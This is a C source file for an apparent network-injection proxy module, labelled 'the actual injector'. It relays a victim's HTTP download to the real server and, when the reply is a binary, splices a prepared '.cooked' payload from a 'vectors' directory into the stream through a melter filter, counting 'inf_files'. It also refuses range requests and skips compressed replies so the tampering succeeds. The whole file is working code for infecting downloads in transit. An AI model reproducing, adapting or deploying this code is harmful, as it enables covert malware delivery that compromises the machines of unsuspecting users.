/*
    MODULE -- proxy module (the actual injector)

    Copyright (C) Alberto Ornaghi

    $Id: proxy_inject_exe.c 3556 2011-06-07 08:54:29Z alor $
*/

#include <main.h>
#include <proxy.h>
#include <threads.h>
#include <file.h>
#include <match.h>
#include <match_request.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <signal.h>

#ifdef HAVE_MELTER
   #include <melt.h>
#endif

/* globals */

/* protos */

int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file);

/************************************************/


int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file)
{
   BIO *fbio = NULL;
   char data[READ_BUFF_SIZE];
   int len, written;
   char *host, *p;

   /* check if the client is performing Range requests. if so, reply not supported */
   if (strstr(header, HTTP_RANGE_TAG)) {

      DEBUG_MSG(D_INFO, "Range request detected, replying 416 Not Satisfable");

      sprintf(data, "HTTP/1.1 416 Requested Range Not Satisfiable\r\n"
                    "Content-Type: text/html\r\n"
                    "Connection: close\r\n"
                    "\r\n");

      /* send the header to the client */
      BIO_write(*cbio, data, strlen(data));
      /* prevent reading from the server */
      *sbio = NULL;

      return -ENOTHANDLED;
   }

   /* retrieve the host tag */
   host = strcasestr(header, HTTP_HOST_TAG);

   if (host == NULL)
      return -EINVALID;

   SAFE_STRDUP(host, host + strlen(HTTP_HOST_TAG));

   /* trim the eol */
   if ((p = strchr(host, '\r')) != NULL)
      *p = 0;
   if ((p = strchr(host, '\n')) != NULL)
      *p = 0;

   /* connect to the real server */
   *sbio = BIO_new(BIO_s_connect());
   BIO_set_conn_hostname(*sbio, host);
   BIO_set_conn_port(*sbio, "http");

   if (BIO_do_connect(*sbio) <= 0) {
      DEBUG_MSG(D_ERROR, "Cannot connect to [%s]", host);
      SAFE_FREE(host);
      return -ENOADDRESS;
   }

   DEBUG_MSG(D_INFO, "Connection to [%s]", host);

   /*
    * sanitize the header to avoid strange reply from the server.
    * we don't want to cope with chunked encoding, gzip, deflate an so on...
    */
   sanitize_header(header);

   DEBUG_MSG(D_EXCESSIVE, "Request is:\n%s", header);

   /* send the request to the server */
   BIO_puts(*sbio, header);

   memset(data, 0, sizeof(data));
   written = 0;

   /* read the reply header from the server */
   LOOP {
      len = BIO_read(*sbio, data + written, sizeof(char));
      if (len <= 0)
         break;

      written += len;
      if (strstr(data, CR LF CR LF) || strstr(data, LF LF))
         break;
   }

   /* if the reply is OK and the file exist, set up the injecting filter */
   if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {

      DEBUG_MSG(D_INFO, "Server [%s] replied HTTP 200 OK", host);

      /* check for stuff that we don't support */
      if (strcasestr(data, "Transfer-Encoding: chunked") ||
          strcasestr(data, "Accept-Encoding: compress") ||
          strcasestr(data, "Accept-Encoding: gzip") ||
          strcasestr(data, "Accept-Encoding: deflate") )
      {

         DEBUG_MSG(D_INFO, "Detected not supported encoding, skipping it");

         /* create a null filtering bio (send as it is) */
         fbio = BIO_new(BIO_f_null());

      } else if ( ! strcasestr(data, "Content-Type: application/") ) {
         DEBUG_MSG(D_INFO, "Not a binary stream, skipping it");

         /* create a null filtering bio (send as it is) */
         fbio = BIO_new(BIO_f_null());
      } else {

         DEBUG_MSG(D_INFO, "Setting up the injection filter");

         char* filename, *path;
         /* complete the path of the file */
         SAFE_CALLOC(filename, sizeof(char), strlen(file) + strlen(".cooked") + 1);
         sprintf(filename, "%s.cooked", file);
         path = get_path("vectors", filename);
         SAFE_FREE(filename);

         DEBUG_MSG(D_INFO, "Cooked file: %s", path);

         /*
          * create the filtering bio (the injector)
          * in case of failure, instantiate a NULL BIO
          */
#ifdef HAVE_MELTER
         fbio = BIO_new_injector(path);
         BIO_ctrl(fbio, BIO_CTRL_SET_DEBUG_FN, 1, debug_msg);
         DEBUG_MSG(D_INFO, "BIO filter instantiated...");
#else
         DEBUG_MSG(D_ERROR, "ERROR: we don't have the melter lib!!!");
         fbio = BIO_new(BIO_f_null());
#endif
         SAFE_FREE(path);

         /* update the stats */
         GBL_STATS->inf_files++;
      }
   } else {

      DEBUG_MSG(D_INFO, "Server [%s] reply is not HTTP 200 OK", host);
      DEBUG_MSG(D_EXCESSIVE, "Server reply is:\n%s", data);

      /* create a null filtering bio (send as it is) */
      fbio = BIO_new(BIO_f_null());
   }

   /* append the filter to the client bio */
   *cbio = BIO_push(fbio, *cbio);

   /* send the headers to the client, the data will be sent in the callee function */
   BIO_write(*cbio, data, written);

   SAFE_FREE(host);

   return ESUCCESS;
}


/* EOF */

// vim:ts=3:expandtab

